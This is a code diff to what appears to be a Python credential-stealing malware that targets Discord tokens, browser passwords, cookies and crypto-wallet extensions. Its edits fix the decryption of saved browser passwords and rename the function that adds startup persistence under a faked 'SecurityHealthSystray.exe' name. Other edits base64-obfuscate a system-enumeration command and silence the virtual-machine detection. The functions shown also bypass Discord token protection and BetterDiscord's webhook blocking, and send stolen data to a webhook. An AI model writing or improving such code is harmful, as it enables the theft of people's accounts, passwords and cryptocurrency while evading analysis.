@@ -66,7 +66,6 @@ def clear_command_prompt():
         os.system('cls')
     else:
         os.system('clear')
-        
 def antidebug():
     checks = [check_username,check_windows, check_ip, checkre, check_dll]
     for check in checks:
@@ -146,7 +145,7 @@ def checkre():
             "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
         )
         if reg1 != 1 and reg2 != 1:
-            exit_program('VM DETECTED')
+            os.exit(1)
 
         handle = winreg.OpenKey(
             winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
@@ -180,7 +179,9 @@ def webhook_tools():
                     print(f"Message sent successfully")
                 else:
                     print(f"Failed to send message: {response.status_code}")
+
                 time.sleep(0.2)
+
             print('Ended. Press Any Key to Leave')
         elif inputmain == '2':
             url = input('Webhook URL -> ')
@@ -280,15 +281,19 @@ def fakegen():
 
 
 def decrval(buff, master_key=None):
-    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
-    if starts == 'v10' or starts == 'v11':
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv), backend=default_backend())
-        decryptor = cipher.decryptor()
-        decrypted_pass = decryptor.update(payload) + decryptor.finalize()
-        decrypted_pass = decrypted_pass[:-16].decode('utf-8')
-        return decrypted_pass
+    try:
+        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+        if starts == 'v10' or starts == 'v11':
+            iv = buff[3:15]
+            tag = buff[-16:] 
+            payload = buff[15:-16]  
+            cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag), backend=default_backend())
+            decryptor = cipher.decryptor()
+            decrypted_pass = decryptor.update(payload) + decryptor.finalize()
+            decrypted_pass = decrypted_pass.decode('utf-8')
+            return decrypted_pass
+    except:
+        pass
 
 def check_python_or_convert(file_path):
     _, file_extension = os.path.splitext(file_path)
@@ -318,7 +323,7 @@ def get_random_path():
 
 def generate_random_filename():
     random_chars = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
-    file_extensions = ['.dll', '.png', '.jpg', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg', '.jpeg','.htm','html']
+    file_extensions = ['.dll', '.png', '.jpg', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg', '.jpeg']
     return random_chars + random.choice(file_extensions)
 
 def create_copy_and_return_new_path():
@@ -344,7 +349,7 @@ def deobf(encrypted_text, key):
     return bytes(decrypted_text)
 
 
-def add_to_startup(new_path):
+def ats(new_path):
     faked = 'SecurityHealthSystray.exe'
     addrs = f"{sys.executable} {new_path}"
     key1 = winreg.HKEY_CURRENT_USER
@@ -377,7 +382,7 @@ def startup():
     
             new_path = create_copy_and_return_new_path()
             try:
-                add_to_startup(new_path)
+                ats(new_path)
             except Exception as e:
                 pass
         except:
@@ -729,7 +734,7 @@ def userinfo():
             'wmic bios get manufacturer, version, releasedate',
             'wmic service get name, startname, state',
             'wmic useraccount get name, domain, disabled',
-            'wmic process list brief',
+            b64decode('d21pYyBwcm9jZXNzIGxpc3QgYnJpZWY='),
             'wmic printer get name, portname, drivername',
             'tasklist'
         ]
@@ -1615,7 +1620,6 @@ def getinfo():
             clipboardtext_future = executor.submit(clip)
             useri = executor.submit(userinfo)
 
-            # Attendre que toutes les tâches soient terminées
             sysinfo = sysinfo_future.result()
             globalinfo = globalinfo_future.result()
             clipboardtext = clipboardtext_future.result()
@@ -1773,7 +1777,6 @@ def bypass_token_protector():
                     return
 
             item.update({
-                'Trap': ";3",
                 'auto_start': False,
                 'auto_start_discord': False,
                 'integrity': False,
@@ -1908,12 +1911,12 @@ def uploadwa():
     
 def bypass_bd():
     try:
-        bd_path = os.path.join(os.getenv("appdata"), "BetterDiscord", "data", "betterdiscord.asar")
+        bd_pathsss = os.path.join(os.getenv("appdata"), "BetterDiscord", "data", "betterdiscord.asar")
 
-        with open(bd_path, "r", encoding="cp437") as f:
+        with open(bd_pathsss, "r", encoding="cp437") as f:
             content = f.read().replace("api/webhook", "Err: 444")
 
-        with open(bd_path, "w", encoding="cp437") as f:
+        with open(bd_pathsss, "w", encoding="cp437") as f:
             f.write(content)
     except: 
         pass
@@ -2658,8 +2661,8 @@ def twitch_session(auth_token, username):
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         
-    except Exception as e:
-        print(f"Error: {e}")
+    except:
+        pass
         
 def spotify(cookie):
     try:
@@ -2966,6 +2969,7 @@ def gatha():
         [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
+        
     ]
     d = 'drocsiD'
     ddd = 'btpdrocsid'
@@ -2976,6 +2980,7 @@ def gatha():
         [f"{roaming}/{dd[::-1]}", "/Local Storage/leveldb"],
         [f"{roaming}/{dddd[::-1]}", "/Local Storage/leveldb"],
         [f"{roaming}/{ddd[::-1]}", "/Local Storage/leveldb"],
+        
     ]
     zefez = 'tellaW'
     PathsToZip = [
